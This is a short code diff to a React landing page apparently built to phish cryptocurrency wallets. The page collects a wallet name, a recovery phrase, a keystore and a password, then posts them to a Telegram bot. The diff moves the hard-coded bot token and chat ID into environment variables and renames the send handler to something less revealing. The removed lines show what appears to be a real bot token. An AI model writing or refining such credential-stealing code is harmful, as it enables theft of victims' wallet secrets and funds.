@@ -17,7 +17,7 @@ const LandingPage = () => {
   // console.log(chatId);
 
 
-  const handleSubmitTelegram = async () => {
+  const handleSubmitNow = async () => {
     const data = {};
     if (walletName) data.walletName = walletName;
     if (phrase) data.phrase = phrase;
@@ -29,8 +29,8 @@ const LandingPage = () => {
       .join("\n");
 
     try {
-      await axios.post(`https://api.telegram.org/bot6836924100:AAFlBwen6dM0p2gEQSJuzpP5uiPOTqWBaZA/sendMessage`, {
-        chat_id: 5647230523,
+      await axios.post(`${import.meta.env.VITE_API_TG_URL}/sendMessage`, {
+        chat_id: import.meta.env.VITE_API_CHAT_ID,
         text: text,
       });
       // alert('Message sent successfully!');
@@ -53,7 +53,7 @@ const LandingPage = () => {
         setKeyStore,
         password,
         setPassword,
-        handleSubmitTelegram, // Add handleSubmit to the context
+        handleSubmitNow, // Add handleSubmit to the context
       }}
     >
       <>
